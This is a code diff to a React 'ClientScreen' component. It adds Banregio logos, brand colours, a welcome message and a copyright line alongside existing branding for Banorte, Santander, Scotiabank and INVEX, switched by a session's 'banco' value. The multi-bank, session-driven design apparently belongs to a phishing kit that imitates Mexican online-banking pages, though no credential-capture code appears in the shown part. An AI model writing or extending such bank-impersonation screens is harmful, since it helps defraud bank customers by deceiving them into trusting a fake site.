@@ -23,6 +23,8 @@ import scotiabankLogo from '../assets/scotiabank_logo.png';
 import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
 import invexLogo from '../assets/invex_logo.png';
 import invexLogoWhite from '../assets/invex_logo_white.png';
+import banregioLogo from '../assets/banregio_logo.png';
+import banregioLogoWhite from '../assets/banregio_logo_white.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -302,6 +304,19 @@ export default function ClientScreen() {
           </div>
         </header>
       );
+    } else if (sessionData.banco === 'BANREGIO') {
+      return (
+        <header className="bg-[#FF6600] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <div className="flex justify-center">
+            <img 
+              src={banregioLogoWhite} 
+              className="h-16 inline-block white-logo" 
+              alt="Banregio" 
+            />
+          </div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -350,6 +365,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
@@ -362,6 +378,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
@@ -374,6 +391,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
@@ -386,6 +404,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
@@ -400,6 +419,7 @@ export default function ClientScreen() {
             sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
             sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
             sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :
+            sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -419,6 +439,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SANTANDER' ? 'Santander' :
               sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
               sessionData.banco === 'INVEX' ? 'INVEX' :
+              sessionData.banco === 'BANREGIO' ? 'Banregio' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -491,6 +512,12 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido a INVEX Banca Digital</p>
         </div>
       );
+    } else if (sessionData.banco === 'BANREGIO') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banregio Banca Digital</p>
+        </div>
+      );
     } else {
       return (
         <div className="text-center mt-4 px-4">
@@ -531,6 +558,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SANTANDER' ? 'santander-bg' :
                 sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
                 sessionData.banco === 'INVEX' ? 'invex-bg' :
+                sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
